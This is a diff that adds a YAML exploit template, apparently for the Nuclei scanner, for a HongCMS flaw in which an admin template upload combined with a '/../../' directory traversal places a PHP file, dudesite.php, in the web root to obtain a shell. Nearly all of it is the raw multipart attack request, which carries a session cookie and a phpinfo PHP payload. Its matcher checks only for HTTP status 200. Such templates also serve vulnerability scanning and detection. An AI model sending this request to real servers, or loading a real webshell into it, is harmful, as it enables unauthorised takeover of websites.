@@ -1,0 +1,88 @@
+id: poc-gan3cbwdsvsluafh
+info:
+  name: HongCMS 目录穿越的后台模版文件上传造成的getshell
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gan3cbwdsvsluafh'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gan3cbwdsvsluafh
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /admin/index.php/template/upload HTTP/1.1
+
+
+    Cache-Control: max-age=0
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMer1nJdTsRVrRPZ6
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: PHPSESSID=mond1i21lhdga3uu95dl55t975; history=%5B%7B%22name%22%3A%22aaaaaaaaaaaaa%22%2C%22pic%22%3A%22%2Fa%22%2C%22link%22%3A%22%2Fdetail%2F%3F3.html%22%2C%22part%22%3A%22%E7%AC%AC1%E9%9B%86%22%7D%5D; G83uI01naUG3safe=44e720c8d1e94fc28e9827da10cc85ae; 44e720c8d1e94fc28e9827da10cc85ae=79a6095ed8d78b560b2fe814991f1ffe; G83uI01naUG3admin=5e7a4183c9672399dedfab3436859c0e; G83uI01naUG3backinfos=0*0*0*0*0*0*0
+
+
+    Connection: close
+
+
+
+
+    ------WebKitFormBoundaryMer1nJdTsRVrRPZ6
+
+
+    Content-Disposition: form-data; name="dir"
+
+
+
+
+    /../../
+
+
+    ------WebKitFormBoundaryMer1nJdTsRVrRPZ6
+
+
+    Content-Disposition: form-data; name="file"; filename="dudesite.php"
+
+
+    Content-Type: application/octet-stream
+
+
+
+
+    <?php phpinfo(); ?>
+
+
+    ------WebKitFormBoundaryMer1nJdTsRVrRPZ6--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /dudesite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
